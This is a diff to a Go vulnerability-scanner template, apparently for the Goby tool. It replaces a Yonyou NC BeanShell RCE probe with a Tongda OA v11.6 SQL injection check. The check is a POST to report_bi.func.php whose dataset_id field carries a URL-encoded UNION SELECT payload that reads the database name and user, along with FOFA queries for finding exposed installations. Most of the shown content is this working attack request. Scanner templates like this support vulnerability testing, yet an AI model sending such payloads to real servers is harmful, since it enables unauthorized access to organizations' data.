@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "通达OA v11.6 report_bi.func.php SQL注入漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"TDXK-通达OA\" || product=\"TDXK-通达OA\"",
+  "GobyQuery": "app=\"TDXK-通达OA\" || product=\"TDXK-通达OA\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -29,12 +29,14 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "uri": "/general/bi_design/appcenter/report_bi.func.php",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
         "data_type": "text",
-        "data": ""
+        "data": "_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&"
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +53,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "td_oa",
             "bz": ""
           }
         ]
@@ -107,7 +109,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "通达OA v11.6 report_bi.func.php SQL注入漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +118,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "tongda OA v11.6 report_bi.func.php SQL injection",
       "Product": "",
       "Description": "",
       "Recommendation": "",
